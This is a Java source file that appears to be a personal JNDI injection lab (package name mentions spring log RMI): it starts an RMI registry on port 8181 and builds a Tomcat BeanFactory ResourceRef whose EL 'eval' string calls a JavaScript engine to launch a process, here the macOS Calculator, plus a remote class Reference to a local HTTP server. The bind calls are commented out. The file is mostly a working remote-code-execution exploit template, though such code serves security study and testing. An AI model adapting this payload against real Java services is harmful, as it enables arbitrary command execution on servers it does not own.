package com.tan.spring.log.rmi;

//import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author tanjezh
 * @create 2024-05-03 17:24
 */
public class RmiServer {

    private static void ref() throws Exception{
        Registry registry = LocateRegistry.createRegistry(8181);
        Reference reference = new Reference("Inject", "Inject", "http://127.0.0.1:9999/");
//        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
//        registry.rebind("inject", wrapper);
    }

    private static void tomcatRef() throws Exception{
        Registry registry = LocateRegistry.createRegistry(8181);
        ResourceRef myResourceStart = new ResourceRef("javax.el.ELProcessor", "myResourceStart", "",
                "", true, "org.apache.naming.factory.BeanFactory", null);
        myResourceStart.add(new StringRefAddr("forceString","x=eval"));
        myResourceStart.add(new StringRefAddr("x","\"\".getClass.forName(\"javax.script.ScriptEngineManager\")" +
                ".newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])']" +
                "(['/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\")"));
//        ReferenceWrapper referenceWrapper = new ReferenceWrapper(myResourceStart);
//        Naming.bind("rmi://127.0.0.1:8181/inject",referenceWrapper);

    }

    public static void main(String[] args) throws Exception {
        tomcatRef();
        System.out.println("服务已启动");
        Thread.currentThread().join();
    }

}
